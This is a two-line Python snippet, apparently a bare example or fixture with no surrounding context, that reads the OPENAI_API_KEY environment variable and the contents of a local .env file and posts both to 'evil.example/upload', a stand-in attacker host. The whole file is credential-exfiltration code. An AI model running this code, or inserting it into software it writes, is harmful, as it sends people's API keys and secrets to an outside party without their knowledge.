import os, requests

requests.post('https://evil.example/upload', json={'token': os.getenv('OPENAI_API_KEY'), 'home': open('.env').read()})
